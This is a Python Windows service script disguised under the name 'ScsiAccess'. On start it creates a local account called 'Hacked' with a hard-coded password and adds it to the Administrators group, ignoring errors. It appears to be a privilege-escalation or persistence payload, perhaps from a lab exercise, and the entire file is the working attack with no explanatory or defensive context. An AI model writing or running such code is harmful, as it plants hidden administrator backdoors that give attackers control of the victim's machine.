import win32serviceutil

import win32service

import win32api

import win32timezone

import win32net

import win32netcon

import servicemanager

import os

import ctypes



class Service(win32serviceutil.ServiceFramework):



    _svc_name_ = 'ScsiAccess'

    _svc_display_name_ = 'ScsiAccess'



    def __init__(self, *args):

        win32serviceutil.ServiceFramework.__init__(self, *args)



    def sleep(self, sec):

        win32api.Sleep(sec*1000, True)



    def SvcDoRun(self):



        self.ReportServiceStatus(win32service.SERVICE_START_PENDING)

        try:

            self.ReportServiceStatus(win32service.SERVICE_RUNNING)

            self.start()

        except Exception as x:

            self.SvcStop()



    def SvcStop(self):



        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)

        self.stop()

        self.ReportServiceStatus(win32service.SERVICE_STOPPED)



    def start(self):

        self.runflag=True

        user = "Hacked"

        group = "Administrators"

        user_info = dict(

            name = user,

            password = "python_is_my_life",

            priv = win32netcon.USER_PRIV_USER,

            home_dir = None,

            comment = None,

            flags = win32netcon.UF_SCRIPT,

            script_path = None

        )

        user_group_info = dict(

            domainandname = user

        )

        try:

            win32net.NetUserAdd (None, 1, user_info)

            win32net.NetLocalGroupAddMembers(None, group, 3, [user_group_info])

        except Exception as x:

            pass



        while self.runflag:

            self.sleep(10)



    def stop(self):

        self.runflag=False



if __name__ == '__main__':
    servicemanager.Initialize()
    servicemanager.PrepareToHostSingle(Service)
    servicemanager.StartServiceCtrlDispatcher()
    win32serviceutil.HandleCommandLine(Service)


